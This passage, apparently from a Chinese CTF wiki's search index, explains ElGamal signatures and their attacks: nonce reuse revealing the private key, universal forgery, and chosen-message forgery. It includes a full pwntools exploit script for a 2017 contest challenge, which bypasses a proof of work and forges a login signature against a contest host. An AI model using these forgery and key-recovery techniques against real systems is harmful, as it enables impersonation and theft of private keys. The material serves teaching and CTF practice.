\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff08\u5341\u8fdb\u5236\u4f4d\u6570\u4e0d\u4f4e\u4e8e160\uff09\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002 \u9009\u53d6 Z_p^* Z_p^* \u7684\u751f\u6210\u5143g\u3002 \u968f\u673a\u9009\u53d6\u6574\u6570d, 0\\leq d \\leq p-2 0\\leq d \\leq p-2 \uff0c\u5e76\u8ba1\u7b97 g^d \\equiv y \\bmod p g^d \\equiv y \\bmod p \u3002 \u5176\u4e2d\u79c1\u94a5\u4e3a{d}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002 \u7b7e\u540d \u00b6 A\u9009\u53d6\u968f\u673a\u6570 k \\in Z_{p-1} k \\in Z_{p-1} \uff0c\u5e76\u4e14gcd(k,p-1)=1\uff0c\u5bf9\u6d88\u606f\u8fdb\u884c\u7b7e\u540d $ sig_d(m,k)=(r,s)$ \u5176\u4e2d r \\equiv g^k \\bmod p r \\equiv g^k \\bmod p \uff0c s \\equiv (m-dr)k^{-1} \\bmod p-1 s \\equiv (m-dr)k^{-1} \\bmod p-1 \u3002 \u9a8c\u8bc1 \u00b6 \u5982\u679c g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p \uff0c\u90a3\u4e48\u9a8c\u8bc1\u6210\u529f\uff0c\u5426\u5219\u9a8c\u8bc1\u5931\u8d25\u3002\u8fd9\u91cc\u9a8c\u8bc1\u6210\u529f\u7684\u539f\u7406\u5982\u4e0b\uff0c\u9996\u5148\u6211\u4eec\u6709 y^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks} y^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks} \u53c8\u56e0\u4e3a s \\equiv (m-dr)k^{-1} \\bmod p-1 s \\equiv (m-dr)k^{-1} \\bmod p-1 \u6240\u4ee5 ks \\equiv m-dr \\bmod p-1 ks \\equiv m-dr \\bmod p-1 \u8fdb\u800c ks+dr=a*(p-1)+m ks+dr=a*(p-1)+m \u6240\u4ee5 g^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m g^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m \u6240\u4ee5\u6839\u636e\u8d39\u9a6c\u5b9a\u7406\uff0c\u53ef\u5f97 g^{ks+dr} \\equiv g^m \\bmod p g^{ks+dr} \\equiv g^m \\bmod p \u96be\u70b9 \u00b6 \u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86r,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684k\u3002 \u5e38\u89c1\u653b\u51fb \u00b6 p\u592a\u5c0f \u00b6 \u968f\u673a\u6570k\u590d\u7528 \u00b6 \u539f\u7406 \u00b6 \u5982\u679c\u7b7e\u540d\u8005\u590d\u7528\u4e86\u968f\u673a\u6570k\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u5730\u8ba1\u7b97\u51fa\u79c1\u94a5\u3002\u5177\u4f53\u7684\u539f\u7406\u5982\u4e0b\uff1a \u5047\u8bbe\u76ee\u524d\u6709\u4e24\u4e2a\u7b7e\u540d\u90fd\u662f\u4f7f\u7528\u540c\u4e00\u4e2a\u968f\u673a\u6570\u8fdb\u884c\u7b7e\u540d\u7684\u3002\u90a3\u4e48\u6211\u4eec\u6709 r \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1 r \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1 \u8fdb\u800c\u6709 s_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1 s_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1 \u4e24\u5f0f\u76f8\u51cf k(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1 k(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1 \u8fd9\u91cc\uff0c s_1,s_2,m_1,m_2,p-1 s_1,s_2,m_1,m_2,p-1 \u5747\u5df2\u77e5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7b97\u51fak\u3002\u5f53\u7136\uff0c\u5982\u679c gcd(s_1-s_2,p-1)!=1 gcd(s_1-s_2,p-1)!=1 \u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u591a\u4e2a\u89e3\uff0c\u8fd9\u65f6\u6211\u4eec\u53ea\u9700\u8981\u591a\u8bd5\u4e00\u8bd5\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636es\u7684\u8ba1\u7b97\u65b9\u6cd5\u5f97\u5230\u79c1\u94a5d\uff0c\u5982\u4e0b d \\equiv \\frac{m-ks}{r} d \\equiv \\frac{m-ks}{r} \u9898\u76ee \u00b6 2016 LCTF Crypto 450 \u901a\u7528\u4f2a\u9020\u7b7e\u540d \u00b6 \u539f\u7406 \u00b6 \u5728\u653b\u51fb\u8005\u77e5\u9053\u4e86\u67d0\u4e2a\u4ebaAlice\u7684\u516c\u94a5\u4e4b\u540e\uff0c\u4ed6\u53ef\u4ee5\u4f2a\u9020Alice\u7684\u7b7e\u540d\u4fe1\u606f\u3002\u5177\u4f53\u539f\u7406\u5982\u4e0b \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\uff0cAlice\u7684\u516c\u94a5\u4e3a{p,g,y}\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u4f2a\u9020 \u9009\u62e9\u6574\u6570 i\uff0cj\uff0c\u5176\u4e2d gcd(j,p-1)=1 gcd(j,p-1)=1 \u3002 \u8ba1\u7b97\u7b7e\u540d\uff0c r \\equiv g^iy^j \\bmod p r \\equiv g^iy^j \\bmod p \uff0c s\\equiv -rj^{-1} \\bmod p-1 s\\equiv -rj^{-1} \\bmod p-1 \u8ba1\u7b97\u6d88\u606f\uff0c m\\equiv si \\bmod p-1 m\\equiv si \\bmod p-1 \u90a3\u4e48\u6b64\u65f6\u751f\u6210\u7684\u7b7e\u540d\u4e0e\u6d88\u606f\u5c31\u662f\u53ef\u4ee5\u88ab\u6b63\u5e38\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5177\u4f53\u63a8\u5bfc\u5982\u4e0b y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p \u53c8\u7531\u4e8e\u6d88\u606fm\u7684\u6784\u9020\u65b9\u5f0f\uff0c\u6240\u4ee5 g^{si} \\equiv g^m \\bmod p-1 g^{si} \\equiv g^m \\bmod p-1 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\u7684\u6d88\u606f\uff0c\u4f46\u662f\u4ed6\u5374\u65e0\u6cd5\u4f2a\u9020\u6307\u5b9a\u683c\u5f0f\u7684\u6d88\u606f\u3002\u800c\u4e14\uff0c\u4e00\u65e6\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u64cd\u4f5c\uff0c\u8fd9\u4e00\u653b\u51fb\u5c31\u4e0d\u518d\u53ef\u884c\u3002 \u5df2\u77e5\u7b7e\u540d\u4f2a\u9020 \u00b6 \u53c2\u8003pdf\u3002 \u9009\u62e9\u7b7e\u540d\u4f2a\u9020 \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5982\u679c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u6211\u4eec\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f97\u5230\u7b7e\u540d\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u65b0\u7684\u4f46\u662f\u6211\u4eec\u4e0d\u80fd\u591f\u9009\u62e9\u7b7e\u540d\u7684\u6d88\u606f\u4f2a\u9020\u7b7e\u540d\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u6211\u4eec\u77e5\u9053\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u5982\u4e0b g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p \u90a3\u4e48\u53ea\u8981\u6211\u4eec\u9009\u62e9\u4e00\u4e2a\u6d88\u606fm\u4f7f\u5176\u548c\u6211\u4eec\u6240\u8981\u4f2a\u9020\u7684\u6d88\u606fm\u2018\u6a21p-1\u540c\u4f59\uff0c\u7136\u540e\u540c\u65f6\u4f7f\u7528\u6d88\u606fm\u7684\u7b7e\u540d\u5373\u53ef\u7ed5\u8fc7\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u4ee52017\u5e74\u56fd\u8d5bmailbox\u4e3a\u4f8b\uff0c i\u6625\u79cb\u6709\u590d\u73b0 \u3002 \u9996\u5148\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u8fdb\u884cproof of work proof = b64 . b64encode ( os . urandom ( 12 )) req . sendall ( \"Please provide your proof of work, a sha1 sum ending in 16 bit's set to 0, it must be of length %d bytes, starting with %s \\n \" % ( len ( proof ) + 5 , proof )) test = req . recv ( 21 ) ha = hashlib . sha1 () ha . update ( test ) if ( test [ 0 : 16 ] != proof or ord ( ha . digest ()[ - 1 ]) != 0 or ord ( ha . digest ()[ - 2 ]) != 0 ): # or ord(ha.digest()[-3]) != 0 or ord(ha.digest()[-4]) != 0): req . sendall ( \"Check failed\" ) req . close () return \u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a\u4ee5proof\u5f00\u5934\u7684\u957f\u5ea6\u4e3aproof\u957f\u5ea6\u52a05\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5176sha1\u7684\u503c\u4ee516\u6bd4\u7279\u76840\u7ed3\u675f\u3002 \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7\u3002 def f ( x ): return sha1 ( prefix + x ) . digest ()[ - 2 :] == ' \\0\\0 ' sh = remote ( '106.75.66.195' , 40001 ) # bypass proof sh . recvuntil ( 'starting with ' ) prefix = sh . recvuntil ( ' \\n ' , drop = True ) print string . ascii_letters s = util . iters . mbruteforce ( f , string . ascii_letters + string . digits , 5 , 'fixed' ) test = prefix + s sh . sendline ( test ) \u8fd9\u91cc\u4f7f\u7528\u4e86pwntools\u4e2d\u7684util.iters.mbruteforce\uff0c\u8fd9\u662f\u4e00\u4e2a\u5229\u7528\u7ed9\u5b9a\u5b57\u7b26\u96c6\u5408\u4ee5\u53ca\u6307\u5b9a\u957f\u5ea6\u8fdb\u884c\u591a\u7ebf\u7a0b\u7206\u7834\u7684\u51fd\u6570\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7206\u7834\u51fd\u6570\uff0c\u8fd9\u91cc\u662fsha1\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u96c6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5b57\u8282\u6570\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u6307\u7684\u662f\u6211\u4eec\u53ea\u5c1d\u8bd5\u5b57\u8282\u6570\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u5b57\u8282\u6570\u7684\u6392\u5217\uff0c\u5373\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\u3002\u66f4\u52a0\u5177\u4f53\u7684\u4fe1\u606f\u8bf7\u53c2\u8003pwntools\u3002 \u7ed5\u8fc7\u4e4b\u540e\uff0c\u6211\u4eec\u7ee7\u7eed\u5206\u6790\u7a0b\u5e8f\uff0c\u7b80\u5355\u770b\u4e0bgenerate_keys\u51fd\u6570\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u51fd\u6570\u662fElGamal\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u770b\u4e86\u770bverify\u51fd\u6570\uff0c\u5c31\u662f\u9a8c\u8bc1\u7b7e\u540d\u7684\u8fc7\u7a0b\u3002 \u7ee7\u7eed\u5206\u6790 if len ( msg ) > MSGLENGTH : req . sendall ( \"what r u do'in?\" ) req . close () return if msg [: 4 ] == \"test\" : r , s = sign ( digitalize ( msg ), sk , pk , p , g ) req . sendall ( \"Your signature is\" + repr (( hex ( r ), hex ( s ))) + \" \\n \" ) else : if msg == \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test : req . sendall ( \"Signature:\" ) sig = self . rfile . readline () . strip () if len ( sig ) > MSGLENGTH : req . sendall ( \"what r u do'in?\" ) req . close () return sig_rs = sig . split ( \",\" ) if len ( sig_rs ) < 2 : req . sendall ( \"yo what?\" ) req . close () return # print \"Got sig\", sig_rs if verify ( digitalize ( msg ), int ( sig_rs [ 0 ]), int ( sig_rs [ 1 ]), pk , p , g ): req . sendall ( \"Login Success. \\n Dr. Ziegler has a message for you: \" + FLAG ) print \"shipped flag\" req . close () return else : req . sendall ( \"You are not the Genji I knew! \\n \" ) \u6839\u636e\u8fd9\u4e09\u4e2aif\u6761\u4ef6\u53ef\u4ee5\u77e5\u9053 \u6211\u4eec\u7684\u6d88\u606f\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7MSGLENGTH\uff0c40000\u3002 \u6211\u4eec\u53ef\u4ee5\u5bf9\u6d88\u606f\u5f00\u5934\u4e3atest\u7684\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\u3002 \u6211\u4eec\u9700\u8981\u4f7f\u5f97\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\uff0c\u4ee5\u6211\u4eec\u7ed5\u8fc7proof\u7684test\u4e3a\u7ed3\u5c3e\u7684\u6d88\u606f\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u63d0\u4f9b\u7b7e\u540d\u7684\u503c\u3002 \u5206\u6790\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u5c31\u77e5\u9053\u4e86\uff0c\u6211\u4eec\u5c31\u662f\u5728\u9009\u62e9\u6307\u5b9a\u7b7e\u540d\u8fdb\u884c\u4f2a\u9020\uff0c\u8fd9\u91cc\u6211\u4eec\u81ea\u7136\u8981\u5145\u5206\u5229\u7528\u7b2c\u4e8c\u4e2aif\u6761\u4ef6\uff0c\u53ea\u8981\u6211\u4eec\u786e\u4fdd\u6211\u4eec\u8f93\u5165\u7684\u6d88\u606f\u7684\u5f00\u5934\u4e3a\u2018test\u2019\uff0c\u5e76\u4e14\u8be5\u6d88\u606f\u4e0e\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u6a21p-1\u540c\u4f59\uff0c\u6211\u4eec\u5373\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002 \u90a3\u6211\u4eec\u5982\u4f55\u6784\u9020\u5462\uff1f\u65e2\u7136\u6d88\u606f\u7684\u957f\u5ea6\u53ef\u4ee5\u8db3\u591f\u957f\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06'test'\u5bf9\u5e94\u768416\u8fdb\u5236\u5148\u5de6\u79fb\u5f97\u5230\u6bd4p-1\u5927\u7684\u6570\u5b57a\uff0c\u7136\u540e\u7528a\u5bf9p-1\u53d6\u6a21\uff0c\u7528a\u518d\u51cf\u53bb\u4f59\u6570\uff0c\u6b64\u65f6a\u6a21p-1\u4f590\u4e86\u3002\u8fd9\u65f6\u518d\u52a0\u4e0a\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u7684\u503c\uff0c\u5373\u5b9e\u73b0\u4e86\u6a21p-1\u540c\u4f59\u3002 \u5177\u4f53\u5982\u4e0b # construct the message begins with 'test' target = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) while 1 : tmp = hex ( victim )[ 2 :] . decode ( 'hex' ) if tmp . startswith ( 'test' ) and ' \\n ' not in tmp : break else : part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) \u6700\u540e\u7684\u811a\u672c\u5982\u4e0b from pwn import * from hashlib import sha1 import string import ast import os import binascii context . log_level = 'debug' def f ( x ): return sha1 ( prefix + x ) . digest ()[ - 2 :] == ' \\0\\0 ' def digitalize ( m ): return int ( m . encode ( 'hex' ), 16 ) sh = remote ( '106.75.66.195' , 40001 ) # bypass proof sh . recvuntil ( 'starting with ' ) prefix = sh . recvuntil ( ' \\n ' , drop = True ) print string . ascii_letters s = util . iters . mbruteforce ( f , string . ascii_letters + string . digits , 5 , 'fixed' ) test = prefix + s sh . sendline ( test ) sh . recvuntil ( 'Current PK we are using: ' ) pubkey = ast . literal_eval ( sh . recvuntil ( ' \\n ' , drop = True )) p = pubkey [ 0 ] g = pubkey [ 1 ] pk = pubkey [ 2 ] # construct the message begins with 'test' target = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) while 1 : tmp = hex ( victim )[ 2 :] . decode ( 'hex' ) if tmp . startswith ( 'test' ) and ' \\n ' not in tmp : break else : part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) assert ( victim % ( p - 1 ) == digitalize ( target ) % ( p - 1 )) # get victim signature sh . sendline ( hex ( victim )[ 2 :] . decode ( 'hex' )) sh . recvuntil ( 'Your signature is' ) sig = ast . literal_eval ( sh . recvuntil ( ' \\n ' , drop = True )) sig = [ int ( sig [ 0 ], 0 ), int ( sig [ 1 ], 0 )] # get flag sh . sendline ( target ) sh . sendline ( str ( sig [ 0 ]) + \",\" + str ( sig [ 1 ])) sh . interactive () \u8fd9\u91cc\u8fd8\u8981\u8bf4\u51e0\u4e2a\u6709\u610f\u601d\u7684\u70b9\u5c31\u662f int(x,0)\u53ea\u7684\u662f\u5c06x\u6309\u7167\u5176\u5b57\u9762\u5bf9\u5e94\u7684\u8fdb\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4int('0x12',0)=18\uff0c\u8fd9\u91cc\u76f8\u5e94\u7684\u5b57\u9762\u5fc5\u987b\u6709\u5bf9\u5e94\u6807\u5fd7\u5f00\u5934\uff0c\u6bd4\u5982\u8bf4\u5341\u516d\u8fdb\u5236\u662f0x,8\u8fdb\u5236\u662f0\uff0c\u4e8c\u8fdb\u5236\u662f0b\u3002\u56e0\u4e3a\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u5c31\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u8bc6\u522b\u4e86\u3002 python(python2) \u91cc\u9762\u5230\u5e95\u591a\u5927\u7684\u6570\uff0c\u8ba1\u7b97\u51fa\u6765\u6700\u540e\u624d\u4f1a\u5e26\u6709L\u5462\uff1f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5927\u4e8eint\u90fd\u4f1a\u6709L\u3002\u4f46\u662f\u8fd9\u4e2a\u91cc\u9762\u7684victim\u786e\u5b9e\u662f\u6ca1\u6709\u7684\uff0c\uff0c \u4e00\u4e2a\u95ee\u9898\uff0c\u5f85\u89e3\u51b3\u3002\u3002","title":"ElGamal \u6570\u5b57\u7b7e\u540d"},{"location":"crypto/signature/elgamal/#elgamal","text":"RSA\u7684\u6570\u5b57\u7b7e\u540d\u65b9\u6848\u51e0\u4e4e\u4e0e\u5176\u52a0\u5bc6\u65b9\u6848\u5b8c\u5168\u4e00\u81f4\uff0c\u53ea\u662f\u5229\u7528\u79c1\u94a5\u8fdb\u884c\u4e86\u7b7e\u540d\u3002\u4f46\u662f\uff0c\u5bf9\u4e8eElGamal\u6765\u8bf4\uff0c\u5176\u7b7e\u540d\u65b9\u6848\u4e0e\u76f8\u5e94\u7684\u52a0\u5bc6\u65b9\u6848\u5177\u6709\u5f88\u5927\u533a\u522b\u3002","title":"ElGamal"},{"location":"crypto/signature/elgamal/#_1","text":"","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/signature/elgamal/#_2","text":"\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff08\u5341\u8fdb\u5236\u4f4d\u6570\u4e0d\u4f4e\u4e8e160\uff09\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002 \u9009\u53d6 Z_p^* Z_p^* \u7684\u751f\u6210\u5143g\u3002 \u968f\u673a\u9009\u53d6\u6574\u6570d, 0\\leq d \\leq p-2 0\\leq d \\leq p-2 \uff0c\u5e76\u8ba1\u7b97 g^d \\equiv y \\bmod p g^d \\equiv y \\bmod p \u3002 \u5176\u4e2d\u79c1\u94a5\u4e3a{d}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/signature/elgamal/#_3","text":"A\u9009\u53d6\u968f\u673a\u6570 k \\in Z_{p-1} k \\in Z_{p-1} \uff0c\u5e76\u4e14gcd(k,p-1)=1\uff0c\u5bf9\u6d88\u606f\u8fdb\u884c\u7b7e\u540d $ sig_d(m,k)=(r,s)$ \u5176\u4e2d r \\equiv g^k \\bmod p r \\equiv g^k \\bmod p \uff0c s \\equiv (m-dr)k^{-1} \\bmod p-1 s \\equiv (m-dr)k^{-1} \\bmod p-1 \u3002","title":"\u7b7e\u540d"},{"location":"crypto/signature/elgamal/#_4","text":"\u5982\u679c g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p \uff0c\u90a3\u4e48\u9a8c\u8bc1\u6210\u529f\uff0c\u5426\u5219\u9a8c\u8bc1\u5931\u8d25\u3002\u8fd9\u91cc\u9a8c\u8bc1\u6210\u529f\u7684\u539f\u7406\u5982\u4e0b\uff0c\u9996\u5148\u6211\u4eec\u6709 y^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks} y^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks} \u53c8\u56e0\u4e3a s \\equiv (m-dr)k^{-1} \\bmod p-1 s \\equiv (m-dr)k^{-1} \\bmod p-1 \u6240\u4ee5 ks \\equiv m-dr \\bmod p-1 ks \\equiv m-dr \\bmod p-1 \u8fdb\u800c ks+dr=a*(p-1)+m ks+dr=a*(p-1)+m \u6240\u4ee5 g^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m g^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m \u6240\u4ee5\u6839\u636e\u8d39\u9a6c\u5b9a\u7406\uff0c\u53ef\u5f97 g^{ks+dr} \\equiv g^m \\bmod p g^{ks+dr} \\equiv g^m \\bmod p","title":"\u9a8c\u8bc1"},{"location":"crypto/signature/elgamal/#_5","text":"\u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86r,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684k\u3002","title":"\u96be\u70b9"},{"location":"crypto/signature/elgamal/#_6","text":"","title":"\u5e38\u89c1\u653b\u51fb"},{"location":"crypto/signature/elgamal/#p","text":"","title":"p\u592a\u5c0f"},{"location":"crypto/signature/elgamal/#k","text":"","title":"\u968f\u673a\u6570k\u590d\u7528"},{"location":"crypto/signature/elgamal/#_7","text":"\u5982\u679c\u7b7e\u540d\u8005\u590d\u7528\u4e86\u968f\u673a\u6570k\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u5730\u8ba1\u7b97\u51fa\u79c1\u94a5\u3002\u5177\u4f53\u7684\u539f\u7406\u5982\u4e0b\uff1a \u5047\u8bbe\u76ee\u524d\u6709\u4e24\u4e2a\u7b7e\u540d\u90fd\u662f\u4f7f\u7528\u540c\u4e00\u4e2a\u968f\u673a\u6570\u8fdb\u884c\u7b7e\u540d\u7684\u3002\u90a3\u4e48\u6211\u4eec\u6709 r \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1 r \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1 \u8fdb\u800c\u6709 s_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1 s_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1 \u4e24\u5f0f\u76f8\u51cf k(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1 k(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1 \u8fd9\u91cc\uff0c s_1,s_2,m_1,m_2,p-1 s_1,s_2,m_1,m_2,p-1 \u5747\u5df2\u77e5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7b97\u51fak\u3002\u5f53\u7136\uff0c\u5982\u679c gcd(s_1-s_2,p-1)!=1 gcd(s_1-s_2,p-1)!=1 \u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u591a\u4e2a\u89e3\uff0c\u8fd9\u65f6\u6211\u4eec\u53ea\u9700\u8981\u591a\u8bd5\u4e00\u8bd5\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636es\u7684\u8ba1\u7b97\u65b9\u6cd5\u5f97\u5230\u79c1\u94a5d\uff0c\u5982\u4e0b d \\equiv \\frac{m-ks}{r} d \\equiv \\frac{m-ks}{r}","title":"\u539f\u7406"},{"location":"crypto/signature/elgamal/#_8","text":"2016 LCTF Crypto 450","title":"\u9898\u76ee"},{"location":"crypto/signature/elgamal/#_9","text":"","title":"\u901a\u7528\u4f2a\u9020\u7b7e\u540d"},{"location":"crypto/signature/elgamal/#_10","text":"\u5728\u653b\u51fb\u8005\u77e5\u9053\u4e86\u67d0\u4e2a\u4ebaAlice\u7684\u516c\u94a5\u4e4b\u540e\uff0c\u4ed6\u53ef\u4ee5\u4f2a\u9020Alice\u7684\u7b7e\u540d\u4fe1\u606f\u3002\u5177\u4f53\u539f\u7406\u5982\u4e0b \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\uff0cAlice\u7684\u516c\u94a5\u4e3a{p,g,y}\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u4f2a\u9020 \u9009\u62e9\u6574\u6570 i\uff0cj\uff0c\u5176\u4e2d gcd(j,p-1)=1 gcd(j,p-1)=1 \u3002 \u8ba1\u7b97\u7b7e\u540d\uff0c r \\equiv g^iy^j \\bmod p r \\equiv g^iy^j \\bmod p \uff0c s\\equiv -rj^{-1} \\bmod p-1 s\\equiv -rj^{-1} \\bmod p-1 \u8ba1\u7b97\u6d88\u606f\uff0c m\\equiv si \\bmod p-1 m\\equiv si \\bmod p-1 \u90a3\u4e48\u6b64\u65f6\u751f\u6210\u7684\u7b7e\u540d\u4e0e\u6d88\u606f\u5c31\u662f\u53ef\u4ee5\u88ab\u6b63\u5e38\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5177\u4f53\u63a8\u5bfc\u5982\u4e0b y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p 